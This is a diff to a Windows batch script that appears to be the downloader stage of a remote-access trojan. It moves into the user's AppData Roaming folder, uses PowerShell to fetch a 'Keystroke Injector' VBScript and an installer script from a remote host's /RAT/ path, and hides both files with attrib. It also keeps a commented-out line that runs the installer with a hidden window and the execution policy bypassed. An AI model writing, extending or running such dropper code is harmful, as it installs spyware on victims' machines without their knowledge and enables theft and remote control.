@@ -23,6 +23,8 @@ if '%errorlevel%' NEQ '0' (
 
 ::----------------------------------------------------------------------------------------------------------------
 
+timeout /t 1
+
 SET currentDirectory=%cd%
 SET TARGETDIR="C:\Users\%username%\AppData\Roaming\"
 :: SET TargetLocToGetFile=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
@@ -33,16 +35,19 @@ cd %TARGETDIR%
 :: -----------------------------------------------------------cmd-------------------------------------------------------------------------
 
 :: download Keystroke Injector
-powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/hello.vbs' -OutFile payload.vbs"
-payload.vbs
+powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/hello.vbs' -OutFile payload.vbs"
+attrib +h "payload.vbs"
+:: payload.vbs
 
 :: -------------------------------------------------------------------------------------------------------------------------------------
-
-cd %currentDirectory%
-:: del module_downloader.cmd
-
 :: -----------------------------------------------------------ps1--------------------------------------------------------------------------
 
-powershell -ExecutionPolicy Bypass -File "%~dp0\installer.ps1"
+powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/installer.ps1' -OutFile installer.ps1"
+attrib +h "installer.ps1"
+::powershell -windowstyle hidden -ExecutionPolicy Bypass -File "%~dp0\installer.ps1"
 
 :: -------------------------------------------------------------------------------------------------------------------------------------
+
+cd %currentDirectory% 
+:: cd %currentDirectory%
+:: del module_downloader.cmd
